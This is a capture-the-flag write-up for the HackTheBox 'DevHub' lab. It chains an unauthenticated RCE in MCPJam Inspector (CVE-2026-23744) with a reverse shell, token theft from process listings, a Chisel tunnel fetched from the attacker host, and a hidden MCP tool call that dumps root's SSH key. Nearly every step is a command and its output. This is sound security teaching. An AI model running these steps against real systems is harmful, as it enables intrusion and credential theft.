# HackTheBox — DevHub Writeup

*by [ak4hit](https://github.com/ak4hit)*

> **Difficulty:** Medium | **OS:** Linux | **Release:** 2026

---

## Attack Path Overview

1. Nmap → port 80 (nginx) + port 6274 (MCPJam Inspector)
2. CVE-2026-23744 → unauthenticated RCE → shell as `mcp-dev`
3. Process enumeration → Jupyter token leaked in `/proc` cmdline
4. Chisel tunnel → Jupyter Lab terminal as `analyst` → **User Flag**
5. Read `.opsmcp_key` → call hidden `ops._admin_dump` endpoint on localhost:5000
6. Root SSH private key dumped via API → SSH as root → **Root Flag**

---

## Step 1 — Reconnaissance

### Nmap

```bash
nmap -A <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Only two open ports. The web server resolves as `devhub.htb` — add it to `/etc/hosts`:

```bash
echo "<TARGET_IP> devhub.htb" >> /etc/hosts
```

### Web Enumeration

Browsing to `http://devhub.htb` shows **DevHub — Internal Development & Analytics Platform**, an internal dashboard listing active services:

![DevHub Homepage](images/devhub-homepage.png)

| Service | Description | Status |
|---|---|---|
| MCP Inspector | MCPJam v1.4.2 — MCP development/debugging tool | Active — Port 6274 |
| Analytics Dashboard | Jupyter-based analytics environment | Internal Only — localhost:8888 |
| Code Repository | Internal Git server | Maintenance Mode |

The MCP Inspector on port 6274 is publicly accessible. Everything else is loopback-only — useful to note for later pivoting.

```bash
curl http://devhub.htb:6274/
# Returns MCPJam Inspector UI — no auth prompt
```

![MCPJam Inspector](images/mcpjam-inspector.png)

```bash
curl http://devhub.htb:6274/api/mcp/servers
# {"success":true,"servers":[]}
```

No auth, no configured servers yet. This is the attack surface.

---

## Step 2 — MCPJam Inspector RCE (CVE-2026-23744)

### What is MCPJam Inspector?

MCPJam Inspector is a web-based tool for developing and testing MCP (Model Context Protocol) servers. It allows registering MCP servers by transport type — including `stdio`, which spawns a local subprocess. The vulnerability in CVE-2026-23744 is that the API endpoint for adding servers is completely unauthenticated, meaning anyone who can reach port 6274 can register a malicious stdio "server" that executes arbitrary commands.

### Exploitation

```bash
git clone https://github.com/InzegoSec/CVE-2026-23744
cd CVE-2026-23744
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Run the exploit:

```bash
python3 CVE-2026-23744.py --url http://devhub.htb:6274 --lhost <YOUR_IP> --lport 4444
```

```
[*] Exploit created by Inzego... Enjoy! ^^
[+] Executing exploit: Payload sent!
[+] Check your nc
```

**Shell received as `mcp-dev`:**

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 3 — Enumeration as mcp-dev

### Network

```bash
netstat -a
```

Internal services listening on loopback:

```
tcp   localhost:8888   LISTEN    ← Jupyter Lab (analyst)
tcp   localhost:5000   LISTEN    ← Flask/OPSMCP (root)
```

Both are inaccessible externally — we need to tunnel in later.

### Processes

```bash
ps aux
```

Two processes stand out immediately:

```
analyst  1052  ...  /home/analyst/jupyter-env/bin/jupyter-lab \
                    --ip=127.0.0.1 --port=8888 \
                    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

root     1077  ...  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Two critical findings:

- **Jupyter token exposed in plaintext** in the process cmdline: `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`
- **`server.py` runs as root** — if it has any dangerous functionality, that's a direct privesc path

### OPSMCP Server

```bash
curl -s http://localhost:5000/
```

```json
{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}
```

We don't have the API key yet — we need to pivot to `analyst` first.

---

## Step 4 — Chisel Tunnel → Jupyter Lab → User Flag

### Setting Up the Tunnel

On Kali, serve the chisel binary and start the reverse tunnel server:

```bash
# Terminal 1 — HTTP server
cd ~/devhub
python3 -m http.server 80

# Terminal 2 — Chisel server
./chisel server --reverse --port 1337
```

On the target:

```bash
curl http://<YOUR_IP>/chisel -o /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client <YOUR_IP>:1337 R:9888:127.0.0.1:8888 R:9500:127.0.0.1:5000 &
```

This forwards:
- `localhost:9888` (Kali) → `127.0.0.1:8888` (target Jupyter)
- `localhost:9500` (Kali) → `127.0.0.1:5000` (target OPSMCP)

### Accessing Jupyter Lab

Browse to `http://localhost:9888` and enter the token when prompted:

![Jupyter Login](images/jupyter-login.png)

```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Open a terminal via **File → New → Terminal**.

![Jupyter Lab Launcher](images/jupyter-lab.png)

We now have a shell as `analyst`:

```
analyst@devhub:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)

analyst@devhub:~$ ls
jupyter-env  notebooks  user.txt

analyst@devhub:~$ cat user.txt
```

![Jupyter Terminal](images/jupyter-terminal.png)

🚩 **User Flag captured.**

---

## Step 5 — OPSMCP API Key + Hidden Tool Discovery

### API Key

```bash
ls -la ~
cat ~/.opsmcp_key
```

The file `.opsmcp_key` in analyst's home directory contains the API key for the OPSMCP server.

### Reading server.py

```bash
cat /opt/opsmcp/server.py
```

The Flask app has two tool registries:

- **`VISIBLE_TOOLS`** — returned by `/tools/list`: `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`
- **`HIDDEN_TOOLS`** — not in `/tools/list` but still callable via `/tools/call`:
  - `ops._debug_mode` — enables debug mode, reveals hidden tool names
  - `ops._admin_dump` — "Emergency credential dump" — reads `/root/.ssh/id_rsa`, dumps password hashes, or returns API tokens depending on the `target` parameter

The `ops._admin_dump` handler directly opens `/root/.ssh/id_rsa` with no additional privilege check. Since the Flask process runs as root, this works.

### Calling the Hidden Tool

```bash
curl -s -X POST http://localhost:9500/tools/call \
  -H "X-API-Key: <key-from-.opsmcp_key>" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Response contains root's RSA private key in full.

> **Why does this work?** The tool registry treats visible and hidden tools identically at execution time — the only difference is whether they appear in `/tools/list`. There's no secondary auth layer for privileged operations, and since the entire Flask app runs as root, any filesystem read it performs has root access.

---

## Step 6 — SSH as Root → Root Flag

Save the private key returned by the API:

```bash
nano root_key   # paste the key
chmod 600 root_key
ssh -i root_key root@devhub.htb
```

```
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)

root@devhub:~# cat root.txt
```

👑 **Root Flag captured.**

---

## Full Attack Chain

```
Nmap → nginx:80 (devhub.htb) + MCPJam Inspector:6274
              ↓
        No auth on /api/mcp/servers
              ↓
   CVE-2026-23744 — stdio RCE via MCP proxy registration
              ↓
        shell as mcp-dev
              ↓
   ps aux → Jupyter token in process cmdline (plaintext)
   netstat → localhost:8888 (Jupyter) + localhost:5000 (OPSMCP)
              ↓
   Chisel reverse tunnel → forward both ports to Kali
              ↓
   Jupyter Lab (token auth) → terminal as analyst
              ↓
          USER FLAG 🚩
              ↓
   ~/.opsmcp_key → OPSMCP API key
   /opt/opsmcp/server.py → hidden tools not in /tools/list
              ↓
   ops._admin_dump (target=ssh_keys, confirm=true)
   server.py runs as root → reads /root/.ssh/id_rsa
              ↓
        SSH as root
              ↓
          ROOT FLAG 👑
```

---

## Key Takeaways

- **MCP Inspector security** — the stdio transport is inherently dangerous when exposed without auth. CVE-2026-23744 is a direct consequence of no authentication on the server registration endpoint.
- **Process cmdlines are public** — any local user can read `/proc/*/cmdline`. Secrets (tokens, passwords, API keys) passed as command-line arguments are visible to all users on the system.
- **Hidden ≠ Protected** — security through obscurity on API endpoints is not access control. Undocumented tools callable with the same credentials as public ones provide no additional protection.
- **Principle of least privilege** — `server.py` had no business running as root. A dedicated low-privilege service account would have broken the privesc chain entirely.

---

*HackTheBox · DevHub · Medium · Linux · by [ak4hit](https://github.com/ak4hit)*
